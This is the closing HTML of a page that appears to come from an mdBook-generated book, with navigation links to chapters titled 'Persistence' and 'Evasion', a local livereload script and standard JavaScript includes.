                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="Persistence.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="Evasion.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="Persistence.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="Evasion.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
